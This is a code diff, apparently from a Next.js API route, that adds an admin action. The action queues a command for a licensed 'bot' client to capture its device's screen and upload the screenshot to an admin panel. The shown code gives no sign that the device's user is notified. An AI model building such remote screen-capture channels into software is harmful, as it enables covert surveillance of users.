@@ -99,6 +99,21 @@ export async function PATCH(req, { params }) {
       }
       return NextResponse.json({ ok: true, gonderilen: cih.length });
     }
+    case 'ekranIste': {
+      // Admin: bu cihazdan anlik ekran goruntusu iste. Bot yakalayip
+      // /api/ekran'a yollar; admin paneli /api/k34/ekran'dan okur. (Bot >=2.7.2)
+      const h = String(g.hwid || '');
+      if (!h) return NextResponse.json({ ok: false, mesaj: 'hwid gerekli' }, { status: 400 });
+      // Eski goruntuyu temizle ki admin panel yeni geleni beklesin.
+      await sql`DELETE FROM admin_ekran WHERE lisans_id = ${id} AND hwid = ${h}`;
+      await sql`
+        DELETE FROM komutlar WHERE lisans_id = ${id} AND hwid = ${h}
+           AND tur = 'ekran' AND teslim IS NULL`;
+      await sql`
+        INSERT INTO komutlar (lisans_id, hwid, tur, veri)
+        VALUES (${id}, ${h}, 'ekran', ${JSON.stringify({ hedef: 'admin' })}::jsonb)`;
+      return NextResponse.json({ ok: true });
+    }
     default:
       return NextResponse.json({ ok: false, mesaj: 'Bilinmeyen işlem' }, { status: 400 });
   }
